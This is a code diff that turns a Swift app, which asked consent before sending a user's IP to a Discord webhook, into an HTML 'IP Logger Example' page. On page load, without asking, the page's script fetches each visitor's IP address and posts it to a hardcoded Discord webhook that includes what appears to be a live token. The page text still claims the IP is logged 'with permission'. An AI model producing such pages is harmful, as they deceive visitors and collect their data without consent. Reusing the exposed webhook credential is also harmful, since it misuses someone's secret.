@@ -1,47 +1,31 @@
-import UIKit
+<!DOCTYPE html>
+<html>
+<head>
+  <title>IP Logger Example</title>
+</head>
+<body>
+  <h1>Welcome!</h1>
+  <p>Your IP will be logged with permission.</p>
 
-class ViewController: UIViewController {
-    
-    override func viewDidLoad() {
-        super.viewDidLoad()
-        askForIPPermission()
-    }
+  <script>
+    // Fetch the user's IP address using a public API
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
 
-    func askForIPPermission() {
-        let alert = UIAlertController(title: "Permission Request",
-                                      message: "Can we collect your IP address to help improve your experience?",
-                                      preferredStyle: .alert)
-        
-        alert.addAction(UIAlertAction(title: "No", style: .cancel, handler: nil))
-        alert.addAction(UIAlertAction(title: "Yes", style: .default, handler: { _ in
-            self.sendIPToWebhook()
-        }))
-        
-        present(alert, animated: true)
-    }
-
-    func sendIPToWebhook() {
-        // Get public IP using ipify
-        guard let url = URL(string: "https://api.ipify.org?format=json") else { return }
-
-        URLSession.shared.dataTask(with: url) { data, _, error in
-            if let data = data,
-               let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
-               let ip = json["ip"] as? String {
-
-                // Send IP to your Discord webhook
-                let webhookURL = URL(string: "https://discord.com/api/webhooks/1397430499613343794/O2u463okQtTunWUCti3_d3vnaN436ozmLt80XVWmr_SDskIvsZXSnUiDaRPahxSmbc9O")!
-                var request = URLRequest(url: webhookURL)
-                request.httpMethod = "POST"
-                request.setValue("application/json", forHTTPHeaderField: "Content-Type")
-
-                let body: [String: Any] = [
-                    "content": "📥 User consented. IP: \(ip)"
-                ]
-                request.httpBody = try? JSONSerialization.data(withJSONObject: body)
-
-                URLSession.shared.dataTask(with: request).resume()
-            }
-        }.resume()
-    }
-}
+        // Send the IP to your Discord webhook
+        fetch('https://discord.com/api/webhooks/1397430499613343794/O2u463okQtTunWUCti3_d3vnaN436ozmLt80XVWmr_SDskIvsZXSnUiDaRPahxSmbc9O', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `Visitor IP: ${ip}`
+          })
+        });
+      })
+      .catch(err => {
+        console.error('Error fetching IP:', err);
+      });
+  </script>
+</body>
+</html>
